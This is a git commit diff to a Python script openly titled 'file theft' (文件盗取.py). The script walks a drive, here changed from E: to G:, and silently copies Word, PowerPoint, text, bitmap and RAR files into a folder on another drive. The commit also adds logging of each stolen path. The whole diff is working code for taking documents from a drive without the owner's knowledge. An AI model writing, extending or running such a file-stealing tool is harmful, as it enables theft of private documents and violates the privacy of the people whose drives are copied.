3ccd075f973c95656ecadba90ea70196ce95fdd4
帅成马 <90511611+13768494@users.noreply.github.com>
2025-07-04 14:10:04 +0800

    Update 文件盗取.py

--- 文件盗取.py
+++ 文件盗取.py
@@ -9,11 +9,12 @@ U_list = U.split('\x00')
 U_list.pop(-1)
 
 count = 0
-for root,ds,fs in os.walk("E:\\"):  # 指定盘符
+for root,ds,fs in os.walk("G:\\"):  # 指定盘符
     for files in tqdm(fs):
         if files.lower().endswith((".docx",".txt",".bmp",".pptx",".rar")):  # 指定文件类型
             file_path = root + "\\" + files
             save_path = "F:\\……\\" + files
             CopyFile(file_path, save_path ,False)
             count += 1
+            print(file_path)
 print(f"已复制{count}个文件")
